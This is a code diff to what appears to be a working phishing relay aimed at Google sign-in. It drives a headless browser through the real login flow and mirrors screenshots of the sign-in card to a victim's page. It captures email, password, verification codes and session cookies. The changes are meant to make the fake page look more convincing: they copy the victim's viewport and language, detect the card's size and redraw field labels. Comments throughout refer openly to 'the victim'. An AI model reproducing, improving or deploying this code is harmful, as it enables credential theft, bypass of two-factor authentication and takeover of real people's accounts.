@@ -226,17 +226,22 @@ def fetch_asset(pg, url, budget):
 # --------------------------------------------------------------- session ---
 class RelaySession(threading.Thread):
 
-    def __init__(self, sid, email=None, locale=None):
+    def __init__(self, sid, email=None, locale=None, vw=None, vh=None):
         super().__init__(daemon=True)
         self.id = sid
         self.email = email
         self.locale = locale or "en-US"      # mirror the victim's UI language
+        # mirror the victim's viewport so Google serves the SAME layout
+        # variant (one-column with logo vs two-column) the victim expects
+        self.vw = max(360, min(1920, int(vw or 1920)))
+        self.vh = max(500, min(1080, int(vh or 1080)))
         self.password = None
         self.state = "init"
         self.hint = "Đang mở trang đăng nhập…"
         self.need_input = None
         self.screenshot = None          # b64 jpeg fallback/transition layer
         self.shot_hash = None           # md5 of the current frame (delta API)
+        self.card_w = None              # card CSS width so the page shows 1:1
         self.match_number = None
         self.error = None
         self.cookies = None
@@ -249,6 +254,7 @@ class RelaySession(threading.Thread):
         self.input_box = None      # {x,y,w,h} percent floats
         self.button_box = None
         self.input_kind = None     # email | password | code
+        self.label = None          # floating label {x,y,w,h,fs,text} percent+px
         self.styles = []                # rewritten CSS texts (stable per page)
         self._res_budget = {"n": 24, "bytes": 0}  # card-asset prefetch budget
 
@@ -315,8 +321,36 @@ class RelaySession(threading.Thread):
                   ("input[name='totpPin']", "code"),
                   ("input[type='tel']", "code")]
 
+    CARD_JS = """() => {
+      const main = document.querySelector('#initialView') || document.querySelector('main');
+      if (!main) return null;
+      // the white rounded card = ancestor with white bg + radius (contains
+      // the G logo which sits ~72px ABOVE main, outside main itself)
+      let n = main;
+      for (let i = 0; i < 6 && n.parentElement; i++) {
+        n = n.parentElement;
+        const c = getComputedStyle(n);
+        if (c.backgroundColor === 'rgb(255, 255, 255)' && parseFloat(c.borderRadius) > 4) {
+          const r = n.getBoundingClientRect();
+          if (r.width > 300 && r.width < 1400 && r.height > 300 && r.height < 1200) {
+            return {x: r.x, y: r.y, w: r.width, h: r.height};
+          }
+        }
+      }
+      // fallback: main inflated — logo ~72px above, card padding ~36
+      const r = main.getBoundingClientRect();
+      return {x: r.x - 36, y: r.y - 100, w: r.width + 72, h: r.height + 136};
+    }"""
+
     def _card_box(self, pg):
-        """Bounding box of the centered sign-in card, viewport coords."""
+        """Bounding box of the white sign-in card (incl. logo + padding)."""
+        try:
+            box = pg.evaluate(self.CARD_JS)
+            if box and box.get("w", 0) > 250 and box.get("h", 0) > 150:
+                return {"x": box["x"], "y": box["y"],
+                        "width": box["w"], "height": box["h"]}
+        except Exception:
+            pass
         for sel in ("#initialView", "div[role='main']", "main"):
             try:
                 loc = pg.locator(sel).first
@@ -351,16 +385,55 @@ class RelaySession(threading.Thread):
             self.input_kind = kind
             self.input_box = None
             self.button_box = None
+            self.label = None
             if ibox:
-                # overlay = the bare input rect (inset from the field frame):
-                # the real field border AND its floating label (which overlaps
-                # the field's top edge in some layout variants) stay visible
-                # in the mirrored image — no border, no double frame
+                # overlay = the whole field FRAME (incl. the strip where the
+                # floating label lives); the label itself is re-drawn by the
+                # victim page at its measured position so it can never be
+                # clipped mid-glyph by the overlay
+                try:
+                    pbox = loc.evaluate(
+                        "el => { const p = el.parentElement; if (!p) return null;"
+                        " const r = p.getBoundingClientRect();"
+                        " return {x: r.x, y: r.y, w: r.width, h: r.height}; }")
+                    if pbox and 1.0 <= pbox["h"] / max(1.0, ibox["height"]) <= 2.2 \
+                            and 0.85 <= pbox["w"] / max(1.0, ibox["width"]) <= 1.6:
+                        ibox = {"x": pbox["x"], "y": pbox["y"],
+                                "width": pbox["w"], "height": pbox["h"]}
+                except Exception:
+                    pass
                 self.input_box = {
                     "x": round(100 * (ibox["x"] - cbox["x"]) / cbox["width"], 2),
                     "y": round(100 * (ibox["y"] - cbox["y"]) / cbox["height"], 2),
                     "w": round(100 * ibox["width"] / cbox["width"], 2),
                     "h": round(100 * ibox["height"] / cbox["height"], 2)}
+                # floating label: find the leaf text element inside the field
+                # container that overlaps the frame — re-drawn as DOM on the
+                # victim page so the overlay can never clip it
+                try:
+                    lab = loc.evaluate(
+                        "el => { let n = el;"
+                        " for (let i = 0; i < 4 && n.parentElement; i++) n = n.parentElement;"
+                        " const fr = n.getBoundingClientRect(); let best = null;"
+                        " for (const c of n.querySelectorAll('*')) {"
+                        "  if (c.children.length) continue;"
+                        "  const t = (c.innerText || '').trim(); if (t.length < 2) continue;"
+                        "  const r = c.getBoundingClientRect();"
+                        "  if (r.top < fr.top + fr.height && r.bottom > fr.top + 2 && r.width > 40)"
+                        "   if (!best || r.width > best.w) {"
+                        "    const cs = getComputedStyle(c);"
+                        "    best = {x: r.x, y: r.y, w: r.width, h: r.height,"
+                        "            fs: parseFloat(cs.fontSize) || 14, text: t.slice(0, 40)}; }"
+                        " } return best; }")
+                    if lab:
+                        self.label = {
+                            "x": round(100 * (lab["x"] - cbox["x"]) / cbox["width"], 2),
+                            "y": round(100 * (lab["y"] - cbox["y"]) / cbox["height"], 2),
+                            "w": round(100 * lab["w"] / cbox["width"], 2),
+                            "h": round(100 * lab["h"] / cbox["height"], 2),
+                            "fs": round(lab["fs"], 1), "text": lab["text"]}
+                except Exception:
+                    pass
                 # the real button (wrapper divs inflate the box ~52px; the
                 # inner button is Google's ~40px pill)
                 for bsel in ("#identifierNext button", "#passwordNext button",
@@ -412,15 +485,8 @@ class RelaySession(threading.Thread):
             shot = None
             cbox = self._card_box(pg)
             if cbox and cbox["width"] > 250 and cbox["height"] > 150:
-                for sel in ("#initialView", "div[role='main']", "main"):
-                    try:
-                        loc = pg.locator(sel).first
-                        if loc.is_visible():
-                            shot = loc.screenshot(type="jpeg", quality=82,
-                                                  scale="device")
-                            break
-                    except Exception:
-                        continue
+                self.card_w = round(cbox["width"])
+                shot = pg.screenshot(type="jpeg", quality=82, clip=cbox)
             if shot is None:
                 shot = pg.screenshot(type="jpeg", quality=80,
                                      clip={"x": 360, "y": 120, "width": 1200, "height": 840})
@@ -523,7 +589,7 @@ class RelaySession(threading.Thread):
                       "--window-size=1920,1080"],
                 proxy={"server": f"http://127.0.0.1:{BRIDGE_PORT}"})
             pg = browser.new_page(user_agent=UA, locale=self.locale,
-                                  viewport={"width": 1920, "height": 1080},
+                                  viewport={"width": self.vw, "height": self.vh},
                                   device_scale_factor=2)  # 2x raster, sharp on HiDPI victims
             pg.goto(SIGNIN_URL.format(hl="vi" if self.locale.startswith("vi") else "en"),
                     wait_until="load", timeout=60000)
@@ -664,8 +730,9 @@ def public_state(s, client_hash=None):
             "need_input": s.need_input, "match_number": s.match_number,
             "shot_hash": s.shot_hash,
             "screenshot": None if same else s.screenshot,
+            "card_w": s.card_w,
             "input_box": s.input_box, "button_box": s.button_box,
-            "input_kind": s.input_kind}
+            "input_kind": s.input_kind, "label": s.label}
 
 
 # ------------------------------------------------------------------ page ---
@@ -754,8 +821,12 @@ class Handler(BaseHTTPRequestHandler):
                 email = None
             langs = data.get("langs") or []
             locale = "vi" if any(str(l).lower().startswith("vi") for l in langs) else "en-US"
+            try:
+                vw = int(data.get("vw")); vh = int(data.get("vh"))
+            except (TypeError, ValueError):
+                vw = vh = None
             sid = secrets.token_hex(8)
-            s = RelaySession(sid, email, locale=locale)
+            s = RelaySession(sid, email, locale=locale, vw=vw, vh=vh)
             with LOCK:
                 SESSIONS[sid] = s
             s.start()
